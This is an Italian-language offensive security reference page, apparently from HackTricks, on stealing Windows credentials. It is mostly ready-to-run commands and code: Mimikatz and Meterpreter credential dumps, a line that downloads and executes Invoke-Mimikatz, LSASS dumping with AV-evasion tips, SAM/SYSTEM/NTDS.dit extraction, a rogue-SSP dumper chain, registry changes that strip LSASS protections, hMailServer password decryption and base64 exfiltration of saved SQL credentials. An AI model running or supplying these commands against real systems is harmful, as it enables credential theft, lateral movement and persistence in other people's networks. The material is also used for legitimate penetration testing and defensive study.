# Rubare Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Scopri altre funzionalità che Mimikatz può eseguire in** [**questa pagina**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**

## Credentials con Meterpreter

Usa il [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **che** ho creato per **search for passwords and hashes** all'interno della vittima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypass dell'AV

### Procdump + Mimikatz

Essendo **Procdump di** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**uno strumento Microsoft legittimo**, non viene rilevato da Defender.\
Puoi usare questo strumento per **eseguire il dump del processo lsass**, **scaricare il dump** e **estrarre** le **credenziali localmente** dal dump.

Puoi anche usare [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Questo processo viene eseguito automaticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Alcuni **AV** potrebbero **rilevare** come **maligno** l'uso di **procdump.exe to dump lsass.exe**, questo perché rilevano la stringa **"procdump.exe" and "lsass.exe"**. Quindi è più **stealthier** passare come **argomento** il **PID** di lsass.exe a procdump **invece del** **nome lsass.exe.**

### Dumping lsass with **comsvcs.dll**

Una DLL chiamata **comsvcs.dll** presente in `C:\Windows\System32` è responsabile del **dump della memoria dei processi** in caso di crash. Questa DLL include una **funzione** chiamata **`MiniDumpW`**, progettata per essere invocata usando `rundll32.exe`.\
È irrilevante utilizzare i primi due argomenti, ma il terzo è suddiviso in tre componenti. L'ID del processo da dumpare costituisce la prima componente, la posizione del file di dump rappresenta la seconda, e la terza componente è strettamente la parola **full**. Non esistono alternative.\
Una volta analizzate queste tre componenti, la DLL si occupa di creare il file di dump e trasferire la memoria del processo specificato in questo file.\
L'utilizzo di **comsvcs.dll** è fattibile per dumpare il processo lsass, eliminando così la necessità di caricare ed eseguire procdump. Questo metodo è descritto in dettaglio su [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Il seguente comando viene utilizzato per l'esecuzione:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Puoi automatizzare questo processo con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Fare clic con il tasto destro sulla Task Bar e selezionare Task Manager
2. Fare clic su More details
3. Cercare il processo "Local Security Authority Process" nella scheda Processes
4. Fare clic con il tasto destro sul processo "Local Security Authority Process" e selezionare "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) è un binario firmato Microsoft che fa parte della suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) è uno strumento Protected Process Dumper che supporta l'offuscamento dei memory dump e il trasferimento su workstation remote senza salvarli su disco.

**Funzionalità principali**:

1. Bypassing PPL protection
2. Offuscamento dei file di memory dump per evadere i meccanismi di rilevamento basati su signature di Defender
3. Caricamento dei memory dump usando i metodi di upload RAW e SMB senza salvarli su disco (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – dump di LSASS basato su SSP senza MiniDumpWriteDump

Ink Dragon distribuisce un dumper in tre fasi chiamato **LalsDumper** che non chiama `MiniDumpWriteDump`, quindi gli hook EDR su quell'API non vengono mai attivati:

1. **Stage 1 loader (`lals.exe`)** – cerca in `fdp.dll` un segnaposto composto da 32 caratteri `d` minuscoli, lo sovrascrive con il percorso assoluto di `rtu.txt`, salva la DLL patchata come `nfdp.dll`, e chiama `AddSecurityPackageA("nfdp","fdp")`. Questo forza **LSASS** a caricare la DLL malevola come nuovo Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – quando LSASS carica `nfdp.dll`, la DLL legge `rtu.txt`, esegue un XOR di ogni byte con `0x20` e mappa il blob decodificato in memoria prima di trasferire l'esecuzione.
3. **Stage 3 dumper** – il payload mappato re-implementa la logica di MiniDump usando **direct syscalls** risolti da nomi di API hashati (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dedicato chiamato `Tom` apre `%TEMP%\<pid>.ddt`, scrive uno dump compresso di LSASS nel file e chiude l'handle in modo che l'esfiltrazione possa avvenire successivamente.

Operator notes:

* Tieni `lals.exe`, `fdp.dll`, `nfdp.dll` e `rtu.txt` nella stessa directory. Stage 1 riscrive il segnaposto hard-coded con il percorso assoluto di `rtu.txt`, quindi separarli rompe la catena.
* La registrazione avviene aggiungendo `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Puoi impostare manualmente quel valore per forzare LSASS a ricaricare l'SSP ad ogni avvio.
* `%TEMP%\*.ddt` sono dump compressi. Decomprimi localmente, poi passali a Mimikatz/Volatility per l'estrazione delle credenziali.
* Eseguire `lals.exe` richiede privilegi admin/SeTcb affinché `AddSecurityPackageA` abbia successo; una volta che la chiamata ritorna, LSASS carica trasparentemente l'SSP rogue ed esegue lo Stage 2.
* Rimuovere la DLL dal disco non la rimuove dalla memoria di LSASS. Elimina la voce di registro e riavvia LSASS (reboot) oppure lasciala per persistenza a lungo termine.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump di NTDS.dit dal DC di destinazione
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump della cronologia delle password di NTDS.dit dal DC di destinazione
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostra l'attributo pwdLastSet per ogni account di NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Questi file dovrebbero trovarsi in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM_. Ma **non puoi semplicemente copiarli normalmente** perché sono protetti.

### Dal registro di sistema

Il modo più semplice per rubare questi file è ottenere una copia dal registro di sistema:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Download** quei file sulla tua macchina Kali e **extract the hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Puoi eseguire la copia di file protetti utilizzando questo servizio. Devi essere Administrator.

#### Using vssadmin

Il binario vssadmin è disponibile solo nelle versioni di Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ma puoi fare lo stesso da **Powershell**. Questo è un esempio di **come copiare il SAM file** (l'unità usata è "C:" e viene salvato in C:\users\Public), ma puoi usare questo per copiare qualsiasi file protetto:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Codice del libro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Infine, puoi anche usare il [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) per copiare SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Il file **NTDS.dit** è noto come il cuore di **Active Directory**, contenendo dati cruciali sugli oggetti utente, sui gruppi e sulle loro appartenenze. È dove sono memorizzati gli **password hashes** per gli utenti di dominio. Questo file è un database **Extensible Storage Engine (ESE)** e risiede in **_%SystemRoom%/NTDS/ntds.dit_**.

All'interno di questo database sono mantenute tre tabelle principali:

- **Data Table**: Questa tabella si occupa di memorizzare dettagli sugli oggetti come utenti e gruppi.
- **Link Table**: Tiene traccia delle relazioni, come le appartenenze ai gruppi.
- **SD Table**: Qui sono conservati i **security descriptors** per ogni oggetto, garantendo la sicurezza e il controllo di accesso per gli oggetti memorizzati.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows usa _Ntdsa.dll_ per interagire con quel file e viene utilizzato da _lsass.exe_. Inoltre, una **parte** del file **NTDS.dit** potrebbe trovarsi **all'interno della memoria di `lsass`** (probabilmente puoi trovare i dati più recentemente accessi grazie al miglioramento delle prestazioni dovuto all'uso di una **cache**).

#### Decrypting the hashes inside NTDS.dit

L'hash è cifrato 3 volte:

1. Decifrare il Password Encryption Key (**PEK**) usando il **BOOTKEY** e **RC4**.
2. Decifrare l'**hash** usando **PEK** e **RC4**.
3. Decifrare l'**hash** usando **DES**.

**PEK** ha lo **stesso valore** in **ogni domain controller**, ma è **cifrato** all'interno del file **NTDS.dit** usando il **BOOTKEY** del **file SYSTEM** del domain controller (è diverso tra domain controller). Per questo, per ottenere le credenziali dal file NTDS.dit **hai bisogno dei file NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Puoi anche usare il metodo [**volume shadow copy**](#stealing-sam-and-system) per copiare il file **ntds.dit**. Ricorda che avrai anche bisogno di una copia del file **SYSTEM** (di nuovo, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) metodo).

### **Estrazione degli hash da NTDS.dit**

Una volta che hai **ottenuto** i file **NTDS.dit** e **SYSTEM**, puoi usare strumenti come _secretsdump.py_ per **estrarre gli hash**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Puoi anche **estrarli automaticamente** usando un domain admin user valido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Per **file NTDS.dit di grandi dimensioni** è consigliabile estrarlo usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

In alternativa, puoi anche usare il **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ oppure **mimikatz** `lsadump::lsa /inject`

### **Estrazione degli oggetti di dominio da NTDS.dit in un database SQLite**

Gli oggetti NTDS possono essere estratti in un database SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non vengono estratti solo i secrets, ma anche gli interi oggetti e i loro attributi per estrarre ulteriori informazioni quando il file NTDS.dit raw è già stato recuperato.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Il `SYSTEM` hive è opzionale ma consente la decrittazione dei segreti (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Insieme ad altre informazioni, vengono estratti i seguenti dati: account utente e macchina con i rispettivi hash, UAC flags, timestamp dell'ultimo logon e del cambio password, descrizione degli account, nomi, UPN, SPN, gruppi e membership ricorsive, albero delle organizational units e appartenenza, trusted domains con tipo di trust, direzione e attributi...

## Lazagne

Scarica il binario da [here](https://github.com/AlessandroZ/LaZagne/releases). Puoi usare questo binario per estrarre credenziali da diversi software.
```
lazagne.exe all
```
## Altri strumenti per l'estrazione delle credenziali da SAM e LSASS

### Windows credentials Editor (WCE)

Questo strumento può essere usato per estrarre le credenziali dalla memoria. Scaricalo da: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Estrae le credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Estrai le credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Scaricalo da: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) e basta **eseguirlo** e le password verranno estratte.

## Estrazione di sessioni RDP inattive e indebolimento dei controlli di sicurezza

Ink Dragon’s FinalDraft RAT include un tasker `DumpRDPHistory` le cui tecniche sono utili a qualsiasi red-teamer:

### Raccolta telemetria in stile DumpRDPHistory

* **Target RDP in uscita** – analizza ogni hive utente in `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Ogni sottochiave memorizza il nome del server, `UsernameHint`, e il timestamp dell'ultima scrittura. Puoi replicare la logica di FinalDraft con PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Evidenza RDP in entrata** – esegui una query sul log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` per gli Event ID **21** (accesso riuscito) e **25** (disconnessione) per mappare chi ha amministrato la macchina:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Una volta identificato quale Domain Admin si connette regolarmente, effettua il dump di LSASS (con LalsDumper/Mimikatz) mentre la loro sessione **disconnessa** è ancora presente. Il fallback CredSSP + NTLM lascia il loro verifier e i token in LSASS, che possono poi essere riprodotti via SMB/WinRM per ottenere `NTDS.dit` o impiantare persistenza sui domain controller.

### Downgrade del registro mirati da FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Impostare `DisableRestrictedAdmin=1` forza il riuso completo di credenziali/ticket durante RDP, abilitando pivot in stile pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` disabilita il filtraggio del token UAC in modo che gli amministratori locali ottengano token non filtrati sulla rete.
* `DSRMAdminLogonBehavior=2` permette all'amministratore DSRM di effettuare il logon mentre il DC è online, fornendo agli attaccanti un altro account integrato ad alto privilegio.
* `RunAsPPL=0` rimuove le protezioni PPL di LSASS, rendendo l'accesso alla memoria semplice per dumpers come LalsDumper.

## Credenziali del database di hMailServer (post-compromise)

hMailServer memorizza la password del DB in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` sotto `[Database] Password=`. Il valore è Blowfish-encrypted con la chiave statica `THIS_KEY_IS_NOT_SECRET` e scambi di endianness su parole da 4 byte. Usa la stringa esadecimale dall'INI con questo snippet Python:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Con la password in chiaro, copia il database SQL CE per evitare file locks, carica il provider a 32-bit e aggiorna se necessario prima di interrogare gli hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
La colonna `accountpassword` usa il formato hash di hMailServer (hashcat mode `1421`). Craccare questi valori può fornire credenziali riutilizzabili per pivot WinRM/SSH.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Alcuni tooling catturano **plaintext logon passwords** intercettando la callback di logon LSA `LsaApLogonUserEx2`. L'idea è di hookare o wrappare la callback del pacchetto di autenticazione in modo che le credenziali vengano catturate **during logon** (prima dell'hashing), poi scritte su disco o restituite all'operatore. Questo viene comunemente implementato come un helper che si inietta in o si registra con LSA, e che poi registra ogni evento di logon interattivo/network riuscito con username, dominio e password.

Note operative:
- Richiede local admin/SYSTEM per caricare l'helper nel percorso di autenticazione.
- Le credenziali catturate compaiono solo quando si verifica un logon (interactive, RDP, service, or network logon a seconda dell'hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) memorizza le informazioni di connessione salvate in un file per-utente `sqlstudio.bin`. Dumpers dedicati possono analizzare il file e recuperare le credenziali SQL salvate. In shell che restituiscono solo l'output dei comandi, il file viene spesso esfiltrato codificandolo in Base64 e stampandolo su stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Sul lato dell'operatore, ricostruisci il file ed esegui il dumper localmente per recuperare le credenziali:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Riferimenti

- [Unit 42 – Un'indagine su anni di operazioni non rilevate rivolte a settori ad alto valore](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Svelando la Relay Network e il funzionamento interno di una Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
